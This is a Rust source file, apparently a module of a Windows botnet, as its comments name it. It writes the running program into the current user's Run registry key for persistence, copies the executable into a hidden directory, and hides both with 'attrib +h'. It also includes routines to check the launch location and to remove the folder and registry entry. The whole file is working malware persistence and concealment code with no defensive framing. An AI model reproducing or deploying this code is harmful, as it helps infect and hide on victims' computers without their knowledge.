extern crate winreg;
extern crate dirs;
use crate::config;
use std::fs;
use std::env;
use winreg::RegKey;
use winreg::enums::*;
use std::path::Path;
use std::process;

// Add botnet to startup register (HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)
// it adds 'config.rs -> FILE_PATH' program to startup
pub fn add_to_startup_reg() {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    let (key, _disp) = hkcu.create_subkey(&path).unwrap();
    key.set_value(config::NAME, &config::FILE_PATH).unwrap();
}

// Move botnet to 'config.rs -> TRUE_DIR' if it isn't already there
pub fn set_to_true_dir() {
    if !Path::new(config::TRUE_DIR).exists() {
        fs::create_dir(config::TRUE_DIR).unwrap();
    }
    if !Path::new(config::FILE_PATH).exists() {
        fs::copy(env::current_exe().unwrap(), &config::FILE_PATH).unwrap();
        let _add_h_dir = process::Command::new("cmd.exe")
            .args(&["/Q", "/C", "attrib", "+h", &config::TRUE_DIR])
            .spawn().unwrap();
        let _add_h_file = process::Command::new("cmd.exe")
            .args(&["/Q", "/C", "attrib", "+h", &config::FILE_PATH])
            .spawn().unwrap();
    }
}

// Check where is botnet was executed from
pub fn check_run_from() -> bool {
    env::current_dir().unwrap().to_str().unwrap() == config::TRUE_DIR
}

// Remove 'config.rs -> TRUE_DIR'
pub fn rm_true_dir() {
    if Path::new(config::TRUE_DIR).exists() {
        fs::remove_dir_all(format!("{}", config::TRUE_DIR)).unwrap();
    }
}

// Remove botnet from startup register
pub fn rm_startup_reg() {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new(r"Software\Microsoft\Windows\CurrentVersion\Run");
    let subkey = hkcu.open_subkey(&path).unwrap();

    let key_handler: String = match subkey.get_value(config::NAME) {
        Ok(data) => data,
        Err(_) => String::from("not found"),
    };

    if key_handler != "not found" {
        let (key, _disp) = hkcu.create_subkey(&path).unwrap();
        key.delete_value(config::NAME).unwrap();
    }
}